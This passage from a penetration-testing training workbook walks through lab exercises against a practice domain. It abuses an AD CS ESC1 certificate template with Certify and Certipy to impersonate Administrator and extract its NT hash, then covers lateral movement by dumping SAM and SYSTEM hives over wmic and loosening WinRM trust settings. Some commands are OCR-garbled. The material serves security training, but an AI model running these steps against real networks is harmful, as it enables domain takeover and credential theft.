We need to configure our Windows system to use the DNS server for lookups ONLY for hiboxy.com. To do this, we need to launch an elevated PowerShell terminal. Open the link in the desktop titled *Terminal*.

Now, let's configure DNS to query 10.130.10.4 for ONLY hiboxy.com. Note, this command does not have any output.

Add-DnsClientNrptRule -Namespace"hiboxy.com" -NameServers10.130.10.4

As a reference we can use the commands below on Linux, but we already preconfigured the system by adding a network ( /etc/ systemd/network/sec560-lab.network).

Do not run the following commands! They are for reference only in your own future environments.

# Command

sudo resolvectl dns tun0 10.130.10.4 sudo resolvectl domain tun0 hiboxy.com

In this lab we are going to attack the certi ficate server (CA01) located at 10.130.10.7. Since your computer is not joined to the hiboxy.com domain, we are going to need to run a command line as hiboxy.com\bgreen since Certify does not have a way to specify alternate credentials.

Let's launch powershell.exe as bgreen using runas . We need to specify a user with /user:domain\username. We are also going to use the /netonly option. This option is for remote connections only, since bgreen does not have permissions on our Windows VM.

#### Command

runas /user:hiboxy.com\bgreen /netonly powershell.exe

When prompted, type the password Password1.

# Expected Results

PS C:\Users\sec560> runas /user:hiboxy.com\bgreen /netonly powershell.exe

Enter the password for hiboxy.com\bgreen:

Attempting to start powershell.exe as user "hiboxy.com\bgreen" ...

#### *2: Initial Query*

Let's list all the CAs and templates. In the new PowerShell window, run a query to list all the CAs and templates. Since this computer is not domain joined, we'll need to include the /domain:hiboxy.com option. If you ran the command on a compromised domain joined host you would not need this option.

# Command Certify.exe cas /domain:hiboxy.com Expected Results PS C:\WINDOWS\system32> Certify.exe cas /domain:hiboxy.com \_\_\_\_\_ \_ \_ \_\_ / \_\_\_\_| | | (\_)/ \_| | | \_\_\_ \_ \_\_| |\_ \_| |\_ \_ \_ | | / \_ \ '\_\_| \_\_| | \_| | | | | |\_\_\_| \_\_/ | | |\_| | | | |\_| | \\_\_\_\_\_\\_\_\_|\_| \\_\_|\_|\_| \\_\_, | \_\_/ | |\_\_\_./ v1.1.0 [\*] Action: Find certificate authorities [\*] Using the search base 'CN=Configuration,DC=hiboxy,DC=com' [\*] Root CAs Cert SubjectName : CN=hiboxy-CA01-CA, DC=hiboxy, DC=com Cert Thumbprint : 3B27C98EE50348DF3121B24919DC864A9B336912 Cert Serial : 6D21D05AA03DCC804840D866F15B02CB Cert Start Date : 9/11/2024 4:22:59 PM Cert End Date : 9/11/2029 4:32:58 PM Cert Chain : CN=hiboxy-CA01-CA,DC=hiboxy,DC=com ...trimmed for brevity...

Let's take a look at the output in more detail. First, we have the list of Root Certificate Authorities (CA).

# [\*] Root CAs Cert SubjectName : CN=hiboxy-CA01-CA, DC=hiboxy, DC=com Cert Thumbprint : 3B27C98EE50348DF3121B24919DC864A9B336912 Cert Serial : 6D21D05AA03DCC804840D866F15B02CB Cert Start Date : 9/11/2024 4:22:59 PM Cert End Date : 9/11/2029 4:32:58 PM Cert Chain : CN=hiboxy-CA01-CA,DC=hiboxy,DC=com

We see the name of the CA certificate is hiboxy-CA01-CA. The serial number, thumbprint, and dates will differ from what is shown above as the servers and certificates are rebuilt weekly.

Note that the Cert Chain only includes the hiboxy-CA01-CA certificate. Root certificates are self-signed and must be explicitly trusted to trust any subordinate certi ficates. Operating systems and browsers come with pre-approved lists of Trusted Root Certification Authorities, such as DigiCert. For a domain CA, this trust is commonly setup in Group Policy to configure all domain hosts to trust the domain CA.

Let's look at the Enterprise/Enrollment CAs list.

# [\*] Enterprise/Enrollment CAs:

 Enterprise CA Name : hiboxy-CA01-CA DNS Hostname : ca01.hiboxy.com

FullName : ca01.hiboxy.com\hiboxy-CA01-CA

Flags : SUPPORTS\_NT\_AUTHENTICATION, CA\_SERVERTYPE\_ADVANCED

Cert SubjectName : CN=hiboxy-CA01-CA, DC=hiboxy, DC=com

Cert Thumbprint : 3B27C98EE50348DF3121B24919DC864A9B336912

Cert Serial : 6D21D05AA03DCC804840D866F15B02CB

 Cert Start Date : 9/11/2024 4:22:59 PM Cert End Date : 9/11/2029 4:32:58 PM

Cert Chain : CN=hiboxy-CA01-CA,DC=hiboxy,DC=com

UserSpecifiedSAN : Disabled

CA Permissions :

Owner: BUILTIN\Administrators S-1-5-32-544

Access Rights Principal

# Allow Enroll NT AUTHORITY\Authenticated UsersS-1-5-11

Allow ManageCA, ManageCertificates BUILTIN\Administrators

S-1-5-32-544

Allow ManageCA, ManageCertificates <UNKNOWN>

S-1-5-21-3338620771-1880071138-2935716604-512

Allow ManageCA, ManageCertificates <UNKNOWN>

S-1-5-21-3338620771-1880071138-2935716604-519 Enrollment Agent Restrictions : None

# Enabled Certificate Templates:

UserAuthenticationCertificate

DirectoryEmailReplication

DomainControllerAuthentication

KerberosAuthentication

EFSRecovery

EFS

DomainController

 WebServer Machine

User

 SubCA Administrator

Notice the line mentioning Allow Enroll .

#### Allow Enroll NT AUTHORITY\Authenticated UsersS-1-5-11

This allows any user to enroll certificates. This is not a safe configuration, but unfortunately it is a relatively common configuration.

# *3: Identifying Vulnerable Templates*

Use Certify to identify vulnerable templates with the command below:

| Command                                         |  |
|-------------------------------------------------|--|
| Certify.exe find /vulnerable /domain:hiboxy.com |  |
|                                                 |  |
|                                                 |  |
|                                                 |  |
|                                                 |  |
|                                                 |  |
|                                                 |  |
|                                                 |  |
|                                                 |  |
|                                                 |  |
|                                                 |  |
|                                                 |  |
|                                                 |  |
|                                                 |  |
|                                                 |  |
|                                                 |  |
|                                                 |  |
|                                                 |  |
|                                                 |  |
|                                                 |  |
|                                                 |  |
|                                                 |  |
|                                                 |  |
|                                                 |  |
|                                                 |  |
|                                                 |  |
|                                                 |  |
|                                                 |  |

# Expected Results

# PS C:\WINDOWS\system32> Certify.exe find /vulnerable /domain:hiboxy.com

```
_____ _ _ __
/ ____| | | (_)/ _|
| | ___ _ __| |_ _| |_ _ _
| | / _ \ '__| __| | _| | | |
| |___| __/ | | |_| | | | |_| |
\_____\___|_| \__|_|_| \__, |
 __/ |
 |___./
```

v1.1.0

- [\*] Action: Find certificate templates
- [\*] Using the search base 'CN=Configuration,DC=hiboxy,DC=com'
- [\*] Listing info about the Enterprise CA 'hiboxy-CA01-CA'

 Enterprise CA Name : hiboxy-CA01-CA DNS Hostname : ca01.hiboxy.com

FullName : ca01.hiboxy.com\hiboxy-CA01-CA

Flags : SUPPORTS\_NT\_AUTHENTICATION, CA\_SERVERTYPE\_ADVANCED

Cert SubjectName : CN=hiboxy-CA01-CA, DC=hiboxy, DC=com

Cert Thumbprint : 3B27C98EE50348DF3121B24919DC864A9B336912

Cert Serial : 6D21D05AA03DCC804840D866F15B02CB

 Cert Start Date : 9/11/2024 4:22:59 PM Cert End Date : 9/11/2029 4:32:58 PM

Cert Chain : CN=hiboxy-CA01-CA,DC=hiboxy,DC=com

UserSpecifiedSAN : Disabled

CA Permissions :

Owner: BUILTIN\Administrators S-1-5-32-544

Access Rights Principal

Allow Enroll NT AUTHORITY\Authenticated

UsersS-1-5-11

Allow ManageCA, ManageCertificates BUILTIN\Administrators

S-1-5-32-544

Allow ManageCA, ManageCertificates <UNKNOWN>

S-1-5-21-3338620771-1880071138-2935716604-512

Allow ManageCA, ManageCertificates <UNKNOWN>

S-1-5-21-3338620771-1880071138-2935716604-519

Enrollment Agent Restrictions : None

# [!] Vulnerable Certificates Templates :

 CA Name : ca01.hiboxy.com\hiboxy-CA01-CA Template Name : UserAuthenticationCertificate

Schema Version : 2

 Validity Period : 1 year Renewal Period : 6 weeks

msPKI-Certificate-Name-Flag : ENROLLEE\_SUPPLIES\_SUBJECT

mspki-enrollment-flag : INCLUDE\_SYMMETRIC\_ALGORITHMS, PUBLISH\_TO\_DS

Authorized Signatures Required : 0

pkiextendedkeyusage : Client Authentication, Encrypting File

System, Secure Email

mspki-certificate-application-policy : Client Authentication, Encrypting File

System, Secure Email

Permissions

Enrollment Permissions

 Enrollment Rights : <UNKNOWN> S-1-5-21-1435937579-2290054825-716303961-519

<UNKNOWN>

S-1-5-21-3338620771-1880071138-2935716604-512

# <UNKNOWN>

S-1-5-21-3338620771-1880071138-2935716604-513

Object Control Permissions

Owner : <UNKNOWN>

S-1-5-21-3338620771-1880071138-2935716604-519

WriteOwner Principals : <UNKNOWN>

S-1-5-21-1435937579-2290054825-716303961-1113

<UNKNOWN>

S-1-5-21-1435937579-2290054825-716303961-519

<UNKNOWN>

S-1-5-21-3338620771-1880071138-2935716604-512

WriteDacl Principals : <UNKNOWN>

S-1-5-21-1435937579-2290054825-716303961-1113

<UNKNOWN>

S-1-5-21-1435937579-2290054825-716303961-519

<UNKNOWN>

S-1-5-21-3338620771-1880071138-2935716604-512

WriteProperty Principals : <UNKNOWN>

S-1-5-21-1435937579-2290054825-716303961-1113

<UNKNOWN>

S-1-5-21-1435937579-2290054825-716303961-519

<UNKNOWN>

S-1-5-21-3338620771-1880071138-2935716604-512

Certify completed in 00:00:03.5484095

The tool identified that the UserAuthenticationCertificate template includes ENROLLEE\_SUPPLIES\_SUBJECT in the msPKI-Certificate-Name-Flag attribute. This is the enrollee-supplied subject ( subjectAltName, or SAN for short) component of ESC1. This setting enables certificate requesters to request certificates for any users in the domain, including domain admin users. Without mitigating controls, this setting enables complete domain takeover. In domains where mitigations prevent Certi ficate Signing Request (CSR) with SANs set for domain admins, this configuration can still be abused to impersonate other domain users. The relevant portion is shown here:

msPKI-Certificate-Name-Flag : ENROLLEE\_SUPPLIES\_SUBJECT

mspki-enrollment-flag : INCLUDE\_SYMMETRIC\_ALGORITHMS, PUBLISH\_TO\_DS

Authorized Signatures Required : 0

The Extended Key Usage (EKU) also permits authentication as shown in this portion of the line:

pkiextendedkeyusage : Client Authentication

The rights are for Domain Users. In our case, since we are not actually joined to the domain, we don't see the full group name and it shows up as <UNKNOWN> . The 513 is always the Domain Users group. The relevant line is shown here:

Enrollment Permissions

Enrollment Rights : <UNKNOWN> S-1-5-21-1435937579-2290054825-716303961-519

<UNKNOWN> S-1-5-21-804912607-507672161-4202880709-512

<UNKNOWN>

S-1-5-21-804912607-507672161-4202880709-513

This configuration allows any authenticated user in the domain to request certificates for any user in the domain. If this template did not include Domain Users, it may still be exploitable if other unprivileged user groups are de fined in the Enrollment Rights section. In that case, exploitation of this vulnerability would require control of a user account in the named group.

All these issues lead up to the AD CS ESC1 vulnerability!

Since we are using runas , the next step will NOT work. The following command is what you would use to request a certificate.

# Command

Do not run this command. It will not work!

Certify.exe request /ca:hiboxy.com\CA01 /onbehalfof:hiboxy.com\bgreen / template:UserAuthenticationCertificate /altname:Administrator /domain:hiboxy.com

Let's try out a different tool, certipy , the Python implementation of certify !

#### *4: Running Find with Certipy*

Switch to your Linux VM for this and later steps.

Open a terminal in your Linux VM and run the Certipy command as shown below to get a list of vulnerable CAs and templates:

certipy find -u bgreen@hiboxy.com -password Password1-dc-ip 10.130.10.4

[ \*] Wrote text output to '20250908180450\_Certipy.txt' [ \*] Saving JSONoutput to '20250908180450\_Certipy.json' [ \*] Wrote JSON output to '20250908180450\_Certipy.json'

# Expected Results

```
sec560@560vm:~$certipy find -u bgreen@hiboxy.com-password Password1 -dc-ip 10.130.10.4
Certipy v5.0.3 - by ( ly4k)
[ *] Finding certificate templates
[ *] Found 34 certificate templates
[ *] Finding certificate authorities
[ *] Found 1 certificate authority
[ *] Found 12 enabled certificate templates
[ *] Finding issuance policies
[ *] Found 13 issuance policies
[ *] Found 0 OIDs linked to templates
[ *] Retrieving CA configuration for 'hiboxy-CA01-CA' via RRP
[ *] Successfully retrieved CA configuration for 'hiboxy-CA01-CA'
[ *] Checking web enrollment for CA'hiboxy-CA01-CA' @ 'ca01.hiboxy.com'
[! ] Error checking web enrollment: timed out
[! ] Use -debug to print a stacktrace
[! ] Error checking web enrollment: timed out
[! ] Use -debug to print a stacktrace
[! ] Failed to lookup object with SID 'S-1-5-21-1435937579-2290054825-716303961-519'
[! ] Failed to lookup object with SID 'S-1-5-21-1435937579-2290054825-716303961-1113'
[ *] Saving text output to '20250908180450_Certipy.txt'
```

The tool creates a .txt and a .json file containing the output. If you like, you can look at the .json file, but it's very long, and not shown here.

Let's look at the template we already know is vulnerable, UserAuthenticationCertificate . We will use grep to search for the string UserAuthenticationCertificate and then show the 19 lines afterwards using the -A 19 option ( -A means to show some number of lines *after* a match, whereas the corresponding -B means to show some number of lines *before* a match).

#### Command cat \*\_Certipy.txt | grep -A 19 UserAuthenticationCertificate Expected Results sec560@560vm:~\$cat \*\_Certipy.txt | grep -A 19 UserAuthenticationCertificate Template Name : UserAuthenticationCertificate Display Name : UserAuthenticationCertificate Certificate Authorities : hiboxy-CA01-CA Enabled : True Client Authentication : True Enrollment Agent : False Any Purpose : False Enrollee Supplies Subject : True Certificate NameFlag : EnrolleeSuppliesSubject Enrollment Flag : IncludeSymmetricAlgorithms PublishToDs Private Key Flag : ExportableKey

: Encrypting File System Secure Email

Client Authentication

: False

: 2

: 1 year

: 6 weeks

Let's look at the interesting lines from the output above.

Authorized Signatures Required : 0

Requires Manager Approval : False

Extended Key Usage

Requires Key Archival

Schema Version

Validity Period

RenewalPeriod

Client Authentication : True

The above line allows users to authenticate using certi ficates from this template.

Enrollee Supplies Subject : True

The above line allows the enrollee (us, the attacker) to specify the subject name.

Requires Manager Approval : False

The above line tells us that no additional approval is required to use this template.

Authorized Signatures Required : 0

The above line tells us that no additional signatures are required to use this template.

Let's look at more information on this template. Run the same command again, but this time let's look at the 41 lines after our template name.

![](SEC560_WorkBook2_page_37_Figure_2.jpeg)

We see that HIBOXY.COM\Domain Users has Enrollment Permissions and that the tool has detected a vulnerable template.

Notice that the tool also gives us the nice group names for many of the accounts and groups.

# *5: Requesting a Certificate with Certipy*

We need the name of the CA server to complete the next step. You may have noticed it, but let's search through the output of the previous command to find it.

# Command grep "CA Name"\*\_Certipy.txt Expected Results sec560@560vm:~\$grep "CA Name"\*\_Certipy.txt CA Name : hiboxy-CA01-CA

We see the name of the CA is hiboxy-CA01-CA.

We need one more thing when running against modern AD:CS servers (running Windows Server 2022 as of February 2025 or later) -- the -sid option with the full Security ID (SID) of the user we are going to impersonate. We can find the SID for the Administrator account using the lookupsid command as follows:

```
Command
 lookupsid.py hiboxy/bgreen:Password1@10.130.10.4 500
 export sid=$( lookupsid.py hiboxy/bgreen:Password1@10.130.10.4500 | grep 'Domain SID is:' | cut -d ' 
  -f5 )
 Expected Results
   sec560@560vm:~$ lookupsid.py hiboxy/bgreen:Password1@10.130.10.4 500
   Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
   [*] Brute forcing SIDs at 10.130.10.4
   [*] StringBinding ncacn_np:10.130.10.4[\pipe\lsarpc]
   [*] Domain SID is: S-1-5-21-3529338552-4282989667-1500421464
   498: HIBOXY\Enterprise Read-only Domain Controllers (SidTypeGroup)
   sec560@560vm:~$ export sid=$(lookupsid.py hiboxy/bgreen:Password1@10.130.10.4500 2>/dev/null |
   grep 'Domain SID is:' | cut -d ' ' -f5 )
```

Let's now request the certificate using the following options:

- req command to request the certificate •
- -username bgreen@hiboxy.com the user to authenticate as •
- -password Password1 password of the user above •
- -ca hiboxy-CA01-CA the name of the CA •
- -template UserAuthenticationCertificate The name of the vulnerable template •

- -upn administrator@hiboxy.com the user we are going to impersonate •
- -sid "\${sid}-500" the SID of the user we are going to impersonate (in this case, Administrator, which has a well-known SID suffix of 500) •
- -target ca01.hiboxy.com the FQDN of the CA server •

Let's run the command:

#### Command

certipy req -username bgreen@hiboxy.com-password Password1-ca hiboxy-CA01-CA -template UserAuthenticationCertificate -upn administrator@hiboxy.com -sid "\${sid}-500" -target ca01.hiboxy.com

# Expected Results

sec560@560vm:~\$certipy req -username bgreen@hiboxy.com-password Password1 -ca hiboxy-CA01-CA template UserAuthenticationCertificate -upn administrator@hiboxy.com -sid "\${sid}-500" -target ca01.hiboxy.com

Certipy v5.0.3 - by ( ly4k)

- [ \*] Requesting certificate via RPC
- [ \*] Request ID is 5
- [ \*] Successfully requested certificate
- [ \*] Got certificate with UPN'administrator@hiboxy.com'
- [ \*] Certificate object SID is 'S-1-5-21-3529338552-4282989667-1500421464-500'
- [\*] Saving certificate and private key to 'administrator.pfx'
- [ \*] Wrote certificate and private key to 'administrator.pfx'

The certificate for the Administrator user is saved in administrator.pfx .

#### *6: Recovering the NT hash using the recovered certificate*

We can now authenticate to any service as the Administrator account using the certi ficate. Let's use the certificate to get the NT hash for the Administrator account.

certipy auth -pfx administrator.pfx -dc-ip 10.130.10.4

```
Expected Results
 sec560@560vm:~$certipy auth -pfx administrator.pfx -dc-ip 10.130.10.4
 Certipy v5.0.3 - by ( ly4k)
 [ *] Certificate identities:
 [ *] SANUPN: 'administrator@hiboxy.com'
 [ *] SANURL SID: 'S-1-5-21-3529338552-4282989667-1500421464-500'
 [ *] Security Extension SID: 'S-1-5-21-3529338552-4282989667-1500421464-500'
 [ *] Using principal: 'administrator@hiboxy.com'
 [ *] Trying to get TGT...
 [ *] Got TGT
 [*] Saving credential cache to 'administrator.ccache'
 [ *] Wrote credential cache to 'administrator.ccache'
 [ *] Trying to retrieve NT hash for 'administrator'
 [*] Got hash for 'administrator@hiboxy.com': aad3b435b51404eeaad3b435b51404ee:
 2e920723943f81ec0af0fd735f737fef
```

The last line of the output includes the user's password hash. We can crack this hash or use it with pass-the-hash!

Notice the line that says Saving credential cache to 'administrator.ccache' . This means we received a TGT (Ticket Granting Ticket) for the Administrator account. We can use this TGT to authenticate via Kerberos to a wide range of services for even more fun!

#### Conclusion

In this lab exercise we identified an insecure AD CS template using two different tools. We then abused the insecurity to get a certificate for bgreen with a subjectAltName (SAN) of the Administrator account. We could use this method to get a certificate for any user, not just the Administrator account. Finally, we used the certi ficate to get the password hash for the user which may be cracked or used with the powerful pass-the-hash attack.

# *Lab 4.4: Lateral Movement from Windows*

# Requires VPN Connection

You must have an active OpenVPN connection using the sec560-labs-range.ovpn file from https://connect.labs.sans.org to complete this exercise.

# Background

With multiple sets of administrative credentials at your disposal, it's time to expand your foothold across Hiboxy's Windows infrastructure. You need to find systems that can access the protected 10.130.11.0/24 subnet you've discovered but cannot reach directly.

Using various Windows lateral movement techniques - from WMI and PowerShell remoting to PsExec - you'll hop between systems looking for dual-homed machines or those with special network access. Each technique has its own advantages and network footprint, and you'll need to choose carefully based on which ports are accessible and which defensive measures might be in place.

→

# Lab Setup

VMs used:

Windows •

You should be able to ping 10.130.10.10 from the Windows VM:

ping 10.130.10.10

# Expected Results

PS C:\Users\sec560> ping 10.130.10.10

Pinging 10.130.10.10 with 32 bytes of data: Reply from 10.130.10.10: bytes=32 time=41ms TTL=63 Reply from 10.130.10.10: bytes=32 time=42ms TTL=63 Reply from 10.130.10.10: bytes=32 time=42ms TTL=63

Reply from 10.130.10.10: bytes=32 time=41ms TTL=63

Ping statistics for 10.130.10.10: Packets: Sent = 4, Received = 4, Lost = 0 (0% loss), Approximate round trip times in milli-seconds: Minimum = 41ms, Maximum = 42ms, Average = 41ms PS C:\Users\sec560>

# Lab - Step-by-Step Instructions

# *1: WMIC to Run Commands on Remote Windows System*

There is a protected subnet in the target environment, and we'd like to get access to it. The subnet is 10.130.11.0/24, and we need to find a system that is either dual homed or has access through an ACL. Let's run some commands on remote Windows systems to find the right system to use as a pivot host.

The wmic command is a powerful native tool to execute commands on remote Windows systems; however, wmic doesn't return the results of the commands. So, we should use it with commands that don't require us to see the results, such as launching an implant or making a configuration change. If we need to see the results, we need to redirect the output to a file and then retrieve it.

First, as we learned in Lab 3.1: MSF psexec, hashdumping, and Mimikatz, bgreen is an admin on 10.130.10.5, 10.130.10.25, and 10.130.10.44. So, we can connect to the hidden administrative share for the C drive, C\$. Let's map a drive to 10.130.10.25's C:Windows\Temp\ directory via the administrative share and then change directories into the the newly mapped drive.

net use Y: \\10.130.10.25\C\$\Windows\Temp /user:hiboxy\bgreen Password1 Y:

# Expected Results

PS C:\Users\sec560> net use Y: \\10.130.10.25\C\$\Windows\Temp /user:hiboxy\bgreen Password1 The command completed successfully.

PS C:\Users\sec560> Y: PS Y:\>

Next, let's create a temp folder named after your Windows VM's OpenVPN interface's IP address to separate our output from the other students working on the lab.

Be sure to change WINDOWS\_ETHERNET2\_ADDRESS to your Windows VM's OpenVPN IP address.

# Command

mkdir WINDOWS\_ETHERNET2\_ADDRESS && cd WINDOWS\_ETHERNET2\_ADDRESS

# Expected Results

PS Y:\> mkdir 10.254.252.2

Directory: Y:\

Mode LastWriteTime Length Name

---- ------------- ------ --- d----- 8/19/2024 12:38 PM 10.254.252.2

PS Y:\> cd 10.254.252.2 PS Y:\10.254.252.2>

Let's gather some information about the target system. We can start with the systeminfo command, but we need to redirect the output to a file since it will not be returned to wmic. Because wmic launches the remote commands directly instead of through a command shell, we can't use a shell redirect to save the output. To work around that, we can use cmd /c to run systeminfo, and since it is now being run by cmd.exe, we can use a shell redirect to save the results.

The wmic command can get quite long and complex, so let's break it down before running it:

- wmic The Windows Management Instrumentation Command. •
- /node:10.130.10.25 /node lets us specify a remote computer or IP. We could also use the @ to specify a file with host names or IP addresses, like /node:@hosts.txt . It would then run the WMI query we specify on each system listed in the file. •
- /user:hiboxy\bgreen /password:Password1 These parameters specify the username and password required to connect to the remote system. If the logged in user is an admin on the remote machine, it is not necessary to specify the username and password. •
- process call create This is the WMI query. In this case, it tells the remote computer to run a specified command. •
- "cmd.exe /c systeminfo > C:\Windows\Temp\WINDOWS\_ETHERNET2\_ADDRESS\systeminfo.txt" This is the command WMI is going to run. Let's break this one down, too. •
- cmd.exe /c When run with /c , cmd.exe "Carries out the command specified by string and then terminates". In other words, cmd.exe will run this next command and quit. We need to use this so we can use a shell redirect to save systeminfo's output. You can see cmd.exe's other options by entering cmd.exe /? in a Windows terminal. •
- systeminfo This is a built in Windows command that gathers information like the OS build version, OS Configuration, Install Date, and installed Hotfixes. •

Be sure to change WINDOWS\_ETHERNET2\_ADDRESS to your VM's OpenVPN IP address. You may need to scroll to the right in the command below to see where it belongs in the command.

## Command

wmic /node:10.130.10.25 /user:hiboxy\bgreen /password:Password1 process call create "cmd.exe /c systeminfo > C:\Windows\Temp\WINDOWS\_ETHERNET2\_ADDRESS\systeminfo.txt"

#### Expected Results

```
Y:\10.254.252.2> wmic /node:10.130.10.25 /user:hiboxy\bgreen /password:Password1 process call create 
"cmd.exe /c systeminfo > C:\Windows\Temp\10.254.252.2\systeminfo.txt"
Executing (Win32_Process)->Create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
 ProcessId = 14944;
 ReturnValue = 0;
};
```

Let's look at the results using the type command to read the text file.

type systeminfo.txt

# Expected Results

PS Y:\10.254.252.2> type systeminfo.txt

Host Name: MAIL01

OS Name: Microsoft Windows Server 2022 Datacenter

OS Version: 10.0.20348 N/A Build 20348 OS Manufacturer: Microsoft Corporation

OS Configuration: Member Server

... output trimmed for brevity ...

While systeminfo is nice, there are more interesting things to loot from the machine. Let's export the SAM and SYSTEM registry hives so we could use secretsdump.py to extract password hashes. This time, we'll use wmic to run the reg save command and save copies of HKEY\_LOCAL\_MACHINE/SAM and HKEY\_LOCAL\_MACHINE/SYSTEM . We can abbreviate HKEY\_LOCAL\_MACHINE as HKLM.

wmic /node:10.130.10.25 /user:hiboxy\bgreen /password:Password1 process call create "reg save HKLM\SAM C: \Windows\Temp\WINDOWS\_ETHERNET2\_ADDRESS\SAM.hive"

wmic /node:10.130.10.25 /user:hiboxy\bgreen /password:Password1 process call create "reg save HKLM\SYSTEM C: \Windows\Temp\WINDOWS\_ETHERNET2\_ADDRESS\SYSTEM.hive"

# Expected Results

```
PS Y:\10.254.252.2> wmic /node:10.130.10.25 /user:hiboxy\bgreen /password:Password1 process call create 
"reg save HKLM\SAM C:\Windows\Temp\10.254.252.2\SAM.hive"
Executing (Win32_Process)->Create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
 ProcessId = 7420;
 ReturnValue = 0;
};
PS Y:\10.254.252.2> wmic /node:10.130.10.25 /user:hiboxy\bgreen /password:Password1 process call create 
"reg save HKLM\SYSTEM C:\Windows\Temp\10.254.252.2\SYSTEM.hive"
Executing (Win32_Process)->Create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
 ProcessId = 18892;
 ReturnValue = 0;
};
```

Nice! Normally we'd copy those files to our machine to extract the hashes with secretsdump.py, but if you run dir , you'll see that the SYSTEM hive is 15-20 MB. To conserve our lab environment's bandwidth, we'll move on to using PowerShell to run commands natively.

#### *2: Invoke-Command and Enter-PSSession*

Invoke-Command, Enter-PsSession , and winrs all use Windows Remote Management to execute commands. The WinRM clients are not enabled by default on Windows 10 and Windows 11, but the server-side components *are* enabled by default for all versions since Windows Server 2012.

To enable the client side WinRM components, open an administrative PowerShell window and run Enable-PSRemoting.

Enable-PSRemoting

# Expected Results

PS Y:\10.254.252.2> Enable-PSRemoting

WARNING: PowerShell remoting has been enabled only for PowerShell 6+ configurations and does not affect Windows PowerShell remoting configurations. Run this cmdlet in Windows PowerShell to affect all PowerShell remoting configurations.

WinRM is already set up to receive requests on this computer.

If you see red error text about WinRM firewall exceptions, you can ignore it. It is warning you the firewall rules to allow WinRM connections are overridden by the the "Public" setting for the current network. Since we don't need anyone to connect to our system with WinRM, it doesn't matter.

Now that we have the WinRM client enabled, we need to make two configuration changes.

1. The WinRM client needs CredSSP enabled. 2. The WinRM client needs to trust any host.

By default, WinRM is configured with CredSSP disabled because the preferred authentication scheme is Microsoft Kerberos. CredSSP uses the Simple and Protected Negotiate (SPNEGO) protocol to negotiate Microsoft Kerberos or NTLM for authentication.

Because our Windows VM is not a member of the target domain, Kerberos will not work. So, WinRM needs CredSSP so it can negotiate down to NTLM authentication.

By default, WinRM only trusts a host if it is specified in the client configuration or if the remote host is a member of the same domain and can use Kerberos for authentication. The default con figuration protects the client from credential harvesting attacks like Responder.

Let's change those two settings.

winrm set winrm/config/client/auth '@{CredSSP ="true"}' winrm set winrm/config/client '@{TrustedHosts ="\*"}'

# Expected Results

```
PS Y:\10.254.252.2> winrm set winrm/config/client/auth '@{CredSSP ="true"}'
Auth
 Basic = true
 Digest = true
 Kerberos = true
 Negotiate = true
 Certificate = true
 CredSSP = true
PS Y:\10.254.252.2> winrm set winrm/config/client '@{TrustedHosts ="*"}'
Client
 NetworkDelayms = 5000
 URLPrefix = wsman
 AllowUnencrypted = false
 Auth
 Basic = true
 Digest = true
 Kerberos = true
 Negotiate = true
 Certificate = true
 CredSSP = true
 DefaultPorts
 HTTP = 5985
 HTTPS = 5986
 TrustedHosts = *
 spn_prefix = HOST
```

Now that we have WinRM enabled, let's use Invoke-Command to run the systeminfo command interactively so we don't have to save the results to a file. We need to use the Get-Credential cmdlet to create a credential object. By default, PowerShell will open a system dialogue box to enter the credentials. We can disable that dialog box by enabling ConsolePrompting in the registry.

# Command

Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\PowerShell\1\ShellIds" -Name ConsolePrompting -Value \$true

#### Expected Results

PS Y:\10.254.252.2> Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\PowerShell\1\ShellIds" -Name ConsolePrompting -Value \$true

With that change in place, use Get-Credential to create a credential object. When prompted in the console bgreen's password, enter Password1.

#### Command

\$Creds = Get-Credential hiboxy\bgreen

# Expected Results

PS Y:\10.254.252.2> \$Creds = Get-Credential hiboxy\bgreen

Now, use Invoke-Command to run systeminfo on 10.130.10.25 with the \$Creds credential object you just created.

#### Command

Invoke-Command 10.130.10.25 -Credential \$Creds {systeminfo}

# Expected Results

PS Y:\10.254.252.2> Invoke-Command 10.130.10.25 -Credential \$Creds {systeminfo}

Host Name: MAIL01

OS Name: Microsoft Windows Server 2022 Datacenter

OS Version: 10.0.20348 N/A Build 20348 OS Manufacturer: Microsoft Corporation OS Configuration: Member Server

[... output trimmed for brevity ...]

Hyper-V Requirements: A hypervisor has been detected. Features required for Hyper-V will not be

displayed.

Notice the prompt returns to the local machine. If we wanted to run a second command, we'd have to use Invoke-Command with the proper syntax again. Instead, let's use Enter-PSSession to launch an interactive shell, allowing us to run as many commands as we want.

Enter-PSSession 10.130.10.25 -Credential \$Creds

# Expected Results

PS Y:\10.254.252.2> Enter-PSSession 10.130.10.25 -Credential \$Creds [10.130.10.25]: PS C:\Users\bgreen\Documents>

You'll notice that PowerShell changes the prompt to include the remote system's IP address, making it easy to know where future commands will execute.

Let's run ipconfig to see if the system is dual-homed and has access to the 10.130.11.0/24 network.

# Command

ipconfig

# Expected Results

[10.130.10.25]: PS C:\Users\bgreen\Documents> ipconfig

Windows IP Configuration

Ethernet adapter Ethernet:

Connection-specific DNS Suffix . : hiboxy.com

Link-local IPv6 Address . . . . . : fe80::8ab3:33b7:a838:fd7a%8

IPv4 Address. . . . . . . . . . . : 10.130.10.25 Subnet Mask . . . . . . . . . . . : 255.255.255.0 Default Gateway . . . . . . . . . : 10.130.10.1

It doesn't look like this system will help us pivot to the .11 network, so let's exit this session and create a session on 10.130.10.5.

exit

Enter-PSSession 10.130.10.5 -Credential \$Creds

# Expected Results

[10.130.10.25]: PS C:\Users\bgreen\Documents> exit PS Y:\10.254.252.2> Enter-PSSession 10.130.10.5 -Credential \$Creds

Enter-PSSession: Connecting to remote server 10.130.10.5 failed with the following error message : WinRM cannot complete the operation. Verify that the specified computer name is valid, that the computer is accessible over the network, and that a firewall exception for the WinRM service is enabled and allows access from this computer. By default, the WinRM firewall exception for public profiles limits access to remote computers within the same local subnet. For more information, see the about\_Remote\_Troubleshooting Help topic.

The command failed. The error mentions several possible causes of the problem. Let's open up tcpview.exe and create a filter for 10.130.10.5 to see what's happening.

![](SEC560_WorkBook2_page_52_Picture_0.jpeg)

#### In TCPView, enter 10.130.10.5 in the search box:

![](SEC560_WorkBook2_page_52_Figure_2.jpeg)

Re-run Enter-PSSession 10.130.10.5 -Credential \$Creds and observe tcpview.exe.

![](SEC560_WorkBook2_page_53_Figure_0.jpeg)

